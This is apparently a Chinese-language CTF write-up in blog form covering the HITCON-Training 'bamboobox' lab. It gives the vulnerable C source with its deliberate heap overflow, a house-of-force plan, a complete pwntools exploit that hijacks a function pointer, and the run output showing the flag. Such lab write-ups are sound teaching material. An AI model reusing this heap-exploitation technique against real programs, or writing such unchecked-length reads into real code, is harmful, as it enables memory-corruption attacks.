@@ -1,0 +1,281 @@
+---
+layout: post
+title: bamboobox house of force
+excerpt: "house of force"
+categories: [Writeup]
+comments: true
+---
+
+首先查看下源码
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+struct item{			
+	int size ;
+	char *name ;
+};
+
+struct item itemlist[100] = {0}; 
+
+int num ;
+
+void hello_message(){						//这个没什么用
+	puts("There is a box with magic");
+	puts("what do you want to do in the box");
+}
+
+void goodbye_message(){						//没什么用
+	puts("See you next time");
+	puts("Thanks you");
+}
+
+struct box{								//通过指针运行两个函数
+	void (*hello_message)();
+	void (*goodbye_message)();
+};
+
+void menu(){								//就是一堆介绍
+	puts("----------------------------");
+	puts("Bamboobox Menu");
+	puts("----------------------------");
+	puts("1.show the items in the box");
+	puts("2.add a new item");
+	puts("3.change the item in the box");
+	puts("4.remove the item in the box");
+	puts("5.exit");
+	puts("----------------------------");
+	printf("Your choice:");
+}
+
+
+void show_item(){
+	int i ;
+	if(!num){
+		puts("No item in the box");		
+	}else{
+		for(i = 0 ; i < 100; i++){
+			if(itemlist[i].name){
+				printf("%d : %s",i,itemlist[i].name);
+			}
+		}
+		puts("");
+	}
+}
+
+int add_item(){
+
+	char sizebuf[8] ;
+	int length ;
+	int i ;
+	int size ;
+	if(num < 100){
+		printf("Please enter the length of item name:");
+		read(0,sizebuf,8);
+		length = atoi(sizebuf);
+		if(length == 0){
+			puts("invaild length");
+			return 0;
+		}
+		for(i = 0 ; i < 100 ; i++){
+			if(!itemlist[i].name){			//遍历找到name为空的位置
+				itemlist[i].size = length ;
+				itemlist[i].name = (char*)malloc(length);
+				printf("Please enter the name of item:");
+				size = read(0,itemlist[i].name,length);		//申请相应长度,写入,然后末尾\x00
+				itemlist[i].name[size] = '\x00';
+				num++;
+				break;
+			}
+		}
+	
+	}else{
+		puts("the box is full");
+	}
+	return 0;
+}
+
+
+
+void change_item(){
+
+	char indexbuf[8] ;
+	char lengthbuf[8];
+	int length ;
+	int index ;
+	int readsize ;
+
+	if(!num){
+		puts("No item in the box");
+	}else{
+		printf("Please enter the index of item:");
+		read(0,indexbuf,8);
+		index = atoi(indexbuf);
+		if(itemlist[index].name){
+			printf("Please enter the length of item name:");
+			read(0,lengthbuf,8);
+			length = atoi(lengthbuf);		//存在的话就重新输入长度,写入
+			printf("Please enter the new name of the item:");
+			readsize = read(0,itemlist[index].name,length);	// 这里存在明显的堆溢出
+			*(itemlist[index].name + readsize) = '\x00';
+		}else{
+			puts("invaild index");
+		}
+		
+	}	
+
+}
+
+void remove_item(){
+	char indexbuf[8] ;
+	int index ;
+
+	if(!num){
+		puts("No item in the box");
+	}else{
+		printf("Please enter the index of item:");
+		read(0,indexbuf,8);
+		index = atoi(indexbuf);
+		if(itemlist[index].name){
+			free(itemlist[index].name);		//如果存在就free掉这个
+			itemlist[index].name = 0 ;
+			itemlist[index].size = 0 ;		//然后置零
+			puts("remove successful!!");
+			num-- ;
+		}else{
+			puts("invaild index");
+		}
+	}
+}
+
+void magic(){			//最终运行这个函数就成功了
+	int fd ;
+	char buffer[100];
+	fd = open("/home/bamboobox/flag",O_RDONLY);
+	read(fd,buffer,sizeof(buffer));
+	close(fd);
+	printf("%s",buffer);
+	exit(0);
+}
+
+int main(){
+	
+	char choicebuf[8];
+	int choice;
+	struct box *bamboo ;		// 两个函数指针
+	setvbuf(stdout,0,2,0);
+	setvbuf(stdin,0,2,0);
+	bamboo = malloc(sizeof(struct box));	//申请空间
+	bamboo->hello_message = hello_message;
+	bamboo->goodbye_message = goodbye_message ;
+	bamboo->hello_message();				//为两个函数指针赋值,并运行其中一个
+
+	while(1){
+		menu();
+		read(0,choicebuf,8);
+		choice = atoi(choicebuf);
+		switch(choice){				//根据输入的选择运行相应的函数
+			case 1:
+				show_item();
+				break;
+			case 2:
+				add_item();
+				break;
+			case 3:
+				change_item();
+				break;
+			case 4:
+				remove_item();
+				break;
+			case 5:
+				bamboo->goodbye_message();		//大概是劫持函数到magic
+				exit(0);
+				break;
+			default:
+				puts("invaild choice!!!");
+				break;
+		
+		}	
+	}
+	return 0 ;
+}
+```
+利用思路
+
+1. 利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。
+2. 利用 house of force 技巧，分配 chunk 至堆的基地址。
+3. 然后修改之
+
+最终的exp
+```
+from pwn import *
+sh=process('./bamboobox')
+elf=ELF('./bamboobox')
+
+def additem(length,name):
+    sh.recvuntil(':')
+    sh.sendline('2')
+    sh.recvuntil(':')
+    sh.sendline(str(length))
+    sh.recvuntil(':')
+    sh.sendline(name)
+
+def modify(idx,length,name):
+    sh.recvuntil(':')
+    sh.sendline('3')
+    sh.recvuntil(':')
+    sh.sendline(str(idx))
+    sh.recvuntil(':')
+    sh.sendline(str(length))
+    sh.recvuntil(':')
+    sh.sendline(name)
+
+def remove(idx):
+    sh.recvuntil(':')
+    sh.sendline('4')
+    sh.recvuntil(':')
+    sh.sendline(str(idx))
+
+def show(idx):
+    sh.recvuntil(':')
+    sh.sendline('1')
+
+magic=0x400d49
+additem(0x30,'aaaa')
+payload=0x30*'a'
+payload+='a'*8+p64(0xffffffffffffffff)		
+modify(0,0x40,payload)			#这里利用一个堆溢出,覆盖topchunk
+off_to_heap_base=-(0x40+0x20)
+malloc_size=off_to_heap_base-0x10
+additem(malloc_size,'aaaa')		#通过计算chunk出现的位置,写出特定大小的malloc
+additem(0x10,p64(magic)*2)		#这里将函数指针覆盖
+sh.sendline('5')				#触发
+sh.interactive()
+```
+最终的运行结果
+```
+ H localhost.localdomain  root  ~ | HITCON-Training | LAB | lab11  python exp.py 
+[+] Starting local process './bamboobox': pid 14235
+[*] '/root/HITCON-Training/LAB/lab11/bamboobox'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Switching to interactive mode
+Please enter the length of item name:Please enter the name of item:[*] Process './bamboobox' stopped with exit code 0 (pid 14235)
+----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:this is mortyflag@@
+
+```
